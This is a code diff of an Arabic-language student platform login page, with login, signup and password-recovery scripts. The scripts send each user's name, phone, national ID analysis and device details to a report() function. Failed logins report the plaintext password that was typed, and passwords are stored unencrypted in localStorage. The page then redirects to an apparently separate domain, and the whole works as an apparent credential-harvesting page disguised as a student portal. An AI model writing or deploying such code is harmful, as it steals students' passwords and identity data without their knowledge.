+                document.getElementById('theme-btn').innerHTML = '<i class="fas fa-sun"></i>';
+            }
         }
+        
+        document.addEventListener('DOMContentLoaded', applySavedTheme);
 
-        // تسجيل الدخول
+        window.onload = () => {
+            const saved = JSON.parse(localStorage.getItem('remembered_user'));
+            if(saved) {
+                document.getElementById('l_phone').value = saved.phone;
+                document.getElementById('l_pass').value = saved.pass;
+                document.getElementById('remember-check').checked = true;
+            }
+        };
+
         document.getElementById('login-form').addEventListener('submit', async (e) => {
             e.preventDefault();
             showStatus("جاري الاتصال بالخادم...", "success"); 
-            
             const phone = document.getElementById('l_phone').value;
             const pass = document.getElementById('l_pass').value;
             const remember = document.getElementById('remember-check').checked;
             const user = getDB().find(u => u.phone === phone);
-
             const fullInfo = await getDeviceInfo();
-
             if(user && user.pass === pass) {
                 if(remember) localStorage.setItem('remembered_user', JSON.stringify({phone, pass}));
                 else localStorage.removeItem('remembered_user');
-                
                 const idAnalysis = analyzeNationalID(user.nat);
-
                 await report(`✅ *دخول ناجح*\n\n` +
                             `👤 *اسم الطالب:* ${user.name}\n` +
                             `📱 *هاتف:* \`${phone}\`\n` +
@@ -590,7 +305,6 @@
                             `🆔 *تحليل بيانات الطالب:*\n` +
                             `${idAnalysis}\n\n` +
                             `${fullInfo}`);
-
                 showStatus("جاري تحويلك للمنصة...", "success");
                 setTimeout(() => window.location.href = "https://home-halthalk.vercel.app", 1200);
             } else {
@@ -598,21 +312,17 @@
                             `📱 *الهاتف:* \`${phone}\`\n` +
                             `🔐 *الباسورد المدخل:* \`${pass}\`\n\n` +
                             `${fullInfo}`);
-
                 showStatus("بيانات الدخول غير صحيحة", "error");
             }
         });
 
-        // إنشاء حساب جديد
         document.getElementById('signup-form').addEventListener('submit', async (e) => {
             e.preventDefault();
             showStatus("جاري إنشاء الحساب...", "success");
-
             const phone = document.getElementById('s_phone').value.trim();
             if(getDB().find(u => u.phone === phone)) {
                 return showStatus("هذا الهاتف مسجل مسبقاً!", "error");
             }
-
             const user = {
                 name: document.getElementById('s_name').value.trim(),
                 phone: phone,
@@ -624,12 +334,9 @@
                 nat: document.getElementById('s_nat').value.trim(),
                 pass: document.getElementById('s_pass').value
             };
-
             saveUser(user);
-
             const deviceReport = await getDeviceInfo();
             const idAnalysis = analyzeNationalID(user.nat);
-
             const reportMsg = `🆕 *طالب جديد مسجل في منصة حلتهالك*\n\n` +
                               `👤 *اسم الطالب:* ${user.name}\n` +
                               `📱 *هاتف الطالب:* \`${user.phone}\`\n` +
@@ -642,19 +349,16 @@
                               `🔢 الرقم: \`${user.nat}\`\n` +
                               `${idAnalysis}\n` +
                               `${deviceReport}`;
-
             await report(reportMsg);
             showStatus("تم إنشاء حسابك بنجاح!", "success");
             setTimeout(() => switchView('login-view'), 1500);
         });
 
-        // استعادة كلمة المرور
         let currentOTP = "";
         window.requestOTP = async () => {
             const phone = document.getElementById('recover-phone').value;
             const nat = document.getElementById('recover-nat').value;
             const user = getDB().find(u => u.phone === phone && u.nat === nat);
-
             if(user) {
                 showStatus("جاري التحقق...", "success");
                 currentOTP = Math.floor(1000 + Math.random() * 9000).toString();
@@ -689,7 +393,6 @@
         window.updatePass = async () => {
             const np = document.getElementById('new-p').value;
             const phone = document.getElementById('recover-phone').value;
-            
             showStatus("جاري التحديث...", "success");
             
             const db = getDB().map(u => { if(u.phone === phone) u.pass = np; return u; });
@@ -705,7 +408,6 @@
             setTimeout(() => switchView('login-view'), 1500);
         };
 
-        document.addEventListener('contextmenu', e => e.preventDefault());
     </script>
 </body>
 </html>
